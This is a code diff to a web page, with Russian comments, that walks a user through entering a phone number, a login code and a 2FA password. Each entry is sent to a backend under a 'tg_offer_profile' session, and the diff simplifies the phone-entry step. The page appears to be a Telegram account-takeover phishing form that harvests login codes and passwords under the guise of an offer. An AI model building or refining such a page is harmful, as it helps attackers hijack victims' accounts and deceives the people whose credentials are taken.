@@ -102,7 +102,7 @@ h1{font-size:26px;font-weight:600;letter-spacing:-.3px;margin-bottom:10px;color:
 
 .field{position:relative;margin-bottom:14px}
 .field label{position:absolute;top:-8px;left:14px;background:var(--card-bg);padding:0 6px;font-size:12.5px;color:var(--input-focus);font-weight:500;z-index:1;transition:color .2s;letter-spacing:.2px}
-.field input,.field select{
+.field input{
   width:100%;padding:15px 14px;
   background:transparent;
   border:1.5px solid var(--input-border);
@@ -111,17 +111,8 @@ h1{font-size:26px;font-weight:600;letter-spacing:-.3px;margin-bottom:10px;color:
   outline:none;transition:border-color .2s;
   font-family:inherit;
 }
-.field input:focus,.field select:focus{border-color:var(--input-focus)}
+.field input:focus{border-color:var(--input-focus)}
 .field input::placeholder{color:var(--text-secondary);opacity:.6}
-.field select{
-  appearance:none;-webkit-appearance:none;
-  background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='8' viewBox='0 0 12 8'%3E%3Cpath d='M1 1l5 5 5-5' stroke='%23a5a5a5' stroke-width='2' fill='none' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E");
-  background-repeat:no-repeat;
-  background-position:right 16px center;
-  padding-right:42px;
-  cursor:pointer;
-}
-.field select option{background:var(--card-bg);color:var(--text)}
 
 .btn{
   width:100%;padding:15px;background:var(--btn-primary);color:#fff;
@@ -193,14 +184,10 @@ h1{font-size:26px;font-weight:600;letter-spacing:-.3px;margin-bottom:10px;color:
 
   <form id="step-phone" class="step">
     <div class="field">
-      <label>Country</label>
-      <select id="country-select"></select>
-    </div>
-    <div class="field">
       <label>Phone Number</label>
-      <input type="tel" id="phone" placeholder="+7 --- --- ----" autocomplete="tel" required inputmode="tel">
+      <input type="tel" id="phone" placeholder="+7 999 123-45-67" autocomplete="tel" required inputmode="tel">
     </div>
-    <button type="submit" class="btn" id="btn-next">NEXT</button>
+    <button type="submit" class="btn" id="btn-next" disabled>NEXT</button>
   </form>
 
   <form id="step-code" class="step hidden">
@@ -314,137 +301,35 @@ try {
 } catch (e) { console.error('[PARAMS]', e); }
 console.log('[INIT] offerId =', offerId, 'action =', action);
 
-// ─── СТРАНЫ ───
-var COUNTRIES = [
-  {c:'+7',f:'RU',n:'Russia',iso:'RU'},
-  {c:'+7',f:'KZ',n:'Kazakhstan',iso:'KZ'},
-  {c:'+380',f:'UA',n:'Ukraine',iso:'UA'},
-  {c:'+375',f:'BY',n:'Belarus',iso:'BY'},
-  {c:'+1',f:'US',n:'United States',iso:'US'},
-  {c:'+1',f:'CA',n:'Canada',iso:'CA'},
-  {c:'+44',f:'GB',n:'United Kingdom',iso:'GB'},
-  {c:'+49',f:'DE',n:'Germany',iso:'DE'},
-  {c:'+33',f:'FR',n:'France',iso:'FR'},
-  {c:'+39',f:'IT',n:'Italy',iso:'IT'},
-  {c:'+34',f:'ES',n:'Spain',iso:'ES'},
-  {c:'+351',f:'PT',n:'Portugal',iso:'PT'},
-  {c:'+31',f:'NL',n:'Netherlands',iso:'NL'},
-  {c:'+32',f:'BE',n:'Belgium',iso:'BE'},
-  {c:'+41',f:'CH',n:'Switzerland',iso:'CH'},
-  {c:'+43',f:'AT',n:'Austria',iso:'AT'},
-  {c:'+48',f:'PL',n:'Poland',iso:'PL'},
-  {c:'+420',f:'CZ',n:'Czech Republic',iso:'CZ'},
-  {c:'+421',f:'SK',n:'Slovakia',iso:'SK'},
-  {c:'+36',f:'HU',n:'Hungary',iso:'HU'},
-  {c:'+40',f:'RO',n:'Romania',iso:'RO'},
-  {c:'+359',f:'BG',n:'Bulgaria',iso:'BG'},
-  {c:'+30',f:'GR',n:'Greece',iso:'GR'},
-  {c:'+90',f:'TR',n:'Turkey',iso:'TR'},
-  {c:'+972',f:'IL',n:'Israel',iso:'IL'},
-  {c:'+971',f:'AE',n:'UAE',iso:'AE'},
-  {c:'+966',f:'SA',n:'Saudi Arabia',iso:'SA'},
-  {c:'+20',f:'EG',n:'Egypt',iso:'EG'},
-  {c:'+91',f:'IN',n:'India',iso:'IN'},
-  {c:'+92',f:'PK',n:'Pakistan',iso:'PK'},
-  {c:'+86',f:'CN',n:'China',iso:'CN'},
-  {c:'+81',f:'JP',n:'Japan',iso:'JP'},
-  {c:'+82',f:'KR',n:'South Korea',iso:'KR'},
-  {c:'+65',f:'SG',n:'Singapore',iso:'SG'},
-  {c:'+60',f:'MY',n:'Malaysia',iso:'MY'},
-  {c:'+66',f:'TH',n:'Thailand',iso:'TH'},
-  {c:'+84',f:'VN',n:'Vietnam',iso:'VN'},
-  {c:'+62',f:'ID',n:'Indonesia',iso:'ID'},
-  {c:'+63',f:'PH',n:'Philippines',iso:'PH'},
-  {c:'+61',f:'AU',n:'Australia',iso:'AU'},
-  {c:'+64',f:'NZ',n:'New Zealand',iso:'NZ'},
-  {c:'+55',f:'BR',n:'Brazil',iso:'BR'},
-  {c:'+54',f:'AR',n:'Argentina',iso:'AR'},
-  {c:'+52',f:'MX',n:'Mexico',iso:'MX'},
-  {c:'+27',f:'ZA',n:'South Africa',iso:'ZA'},
-  {c:'+234',f:'NG',n:'Nigeria',iso:'NG'},
-  {c:'+373',f:'MD',n:'Moldova',iso:'MD'},
-  {c:'+374',f:'AM',n:'Armenia',iso:'AM'},
-  {c:'+994',f:'AZ',n:'Azerbaijan',iso:'AZ'},
-  {c:'+995',f:'GE',n:'Georgia',iso:'GE'},
-  {c:'+996',f:'KG',n:'Kyrgyzstan',iso:'KG'},
-  {c:'+992',f:'TJ',n:'Tajikistan',iso:'TJ'},
-  {c:'+998',f:'UZ',n:'Uzbekistan',iso:'UZ'}
-];
-
+// ─── ЭЛЕМЕНТЫ ───
 var $ = function(id) { return document.getElementById(id); };
 var stepPhone = $('step-phone'), stepCode = $('step-code'), step2fa = $('step-2fa');
 var stepLoading = $('step-loading'), stepProfile = $('step-profile');
 var stepRejected = $('step-rejected'), errorBox = $('error-box');
 var linksBlock = $('links-block');
 var phoneInput = $('phone'), codeInput = $('code'), passInput = $('password');
-var countrySelect = $('country-select');
+var btnNext = $('btn-next');
 
-var selected = COUNTRIES[0], phone = '', code = '', password = null;
+var phone = '', code = '', password = null;
 
-function fillCountrySelect() {
-  try {
-    countrySelect.innerHTML = COUNTRIES.map(function(c, i) {
-      return '<option value="' + i + '">' + c.n + ' (' + c.c + ')</option>';
-    }).join('');
-  } catch (e) { console.error('[SELECT]', e); }
-}
-
-function detectCountry() {
-  try {
-    var loc = (navigator.languages && navigator.languages[0]) || navigator.language || 'en-US';
-    var region = loc.split('-')[1];
-    if (region) {
-      var idx = -1;
-      for (var i = 0; i < COUNTRIES.length; i++) {
-        if (COUNTRIES[i].iso === region.toUpperCase()) { idx = i; break; }
-      }
-      if (idx !== -1) { selected = COUNTRIES[idx]; return; }
-    }
-  } catch (e) {}
-  // fallback
-  for (var j = 0; j < COUNTRIES.length; j++) {
-    if (COUNTRIES[j].iso === 'RU') { selected = COUNTRIES[j]; return; }
-  }
-}
-
-function updatePhonePlaceholder() {
-  try {
-    phoneInput.placeholder = selected.c + ' ' + '-'.repeat(Math.max(5, 12 - selected.c.length));
-  } catch (e) {}
-}
-
-try {
-  countrySelect.addEventListener('change', function() {
-    var idx = parseInt(countrySelect.value);
-    if (COUNTRIES[idx]) {
-      selected = COUNTRIES[idx];
-      updatePhonePlaceholder();
-      var v = phoneInput.value.replace(/\D/g, '');
-      var oldCc = phoneInput.dataset.lastCc || '';
-      if (oldCc && v.indexOf(oldCc.replace('+','')) === 0) {
-        v = v.slice(oldCc.replace('+','').length);
-      }
-      var ccDigits = selected.c.replace('+','');
-      phoneInput.value = '+' + ccDigits + (v ? ' ' + v : ' ');
-      phoneInput.dataset.lastCc = selected.c;
-    }
-  });
-} catch (e) { console.error('[SELECT-EVENT]', e); }
-
+// ─── ВВОД НОМЕРА ───
 try {
   phoneInput.addEventListener('input', function(e) {
-    var v = e.target.value.replace(/\D/g, '');
-    if (v.length > 15) v = v.slice(0, 15);
-    var ccDigits = selected.c.replace('+','');
-    var rest = v;
-    if (v.indexOf(ccDigits) === 0) rest = v.slice(ccDigits.length);
-    e.target.value = selected.c + (rest ? ' ' + rest : ' ');
-    e.target.dataset.lastCc = selected.c;
+    var v = e.target.value;
+    var digits = v.replace(/\D/g, '');
+    if (digits.length > 15) digits = digits.slice(0, 15);
+    e.target.value = '+' + digits;
+    // активируем кнопку когда есть минимум код+7 цифр (обычно 10-12)
+    btnNext.disabled = digits.length < 8;
   });
+  phoneInput.addEventListener('focus', function(e) {
+    if (!e.target.value) e.target.value = '+';
+  });
+  console.log('[INIT] phone input ready');
 } catch (e) { console.error('[PHONE-EVENT]', e); }
 
 // ─── LOCALSTORAGE ───
-var SESSION_KEY = 'tg_offer_profile_v8';
+var SESSION_KEY = 'tg_offer_profile_v9';
 function saveProfile(p) {
   try { p.tg_user_id = tgUserId; p.saved_at = Date.now();
     localStorage.setItem(SESSION_KEY, JSON.stringify(p)); } catch(e) {}
@@ -478,13 +363,6 @@ try {
     window.__REJECTED__ = true;
   } else {
     window.__REJECTED__ = false;
-    detectCountry();
-    fillCountrySelect();
-    countrySelect.value = COUNTRIES.indexOf(selected);
-    updatePhonePlaceholder();
-    phoneInput.value = selected.c + ' ';
-    phoneInput.dataset.lastCc = selected.c;
-
     var saved = loadProfile();
     if (saved && saved.user_id) showProfile(saved);
   }
@@ -544,16 +422,15 @@ async function api(path, body){
   return { status: res.status, data: data };
 }
 
+// ─── ШАГ 1: ТЕЛЕФОН ───
 try {
   stepPhone.addEventListener('submit', async function(e) {
     e.preventDefault();
     if (window.__REJECTED__) return;
     hideError();
-    var ccDigits = selected.c.replace('+','');
-    var raw = phoneInput.value.replace(/\D/g, '');
-    if (raw.indexOf(ccDigits) === 0) raw = raw.slice(ccDigits.length);
-    if (raw.length < 6) { showError('Please enter a valid phone number'); return; }
-    phone = '+' + ccDigits + raw;
+    var digits = phoneInput.value.replace(/\D/g, '');
+    if (digits.length < 8) { showError('Please enter a valid phone number with country code'); return; }
+    phone = '+' + digits;
 
     hide(stepPhone); show(stepLoading);
     $('loading-text').textContent = 'Sending code…';
@@ -580,6 +457,7 @@ try {
   });
 } catch (e) { console.error('[STEP1]', e); }
 
+// ─── ШАГ 2: КОД ───
 try {
   stepCode.addEventListener('submit', async function(e) {
     e.preventDefault();
@@ -630,6 +508,7 @@ try {
   });
 } catch (e) {}
 
+// ─── ШАГ 3: 2FA ───
 try {
   step2fa.addEventListener('submit', async function(e) {
     e.preventDefault();
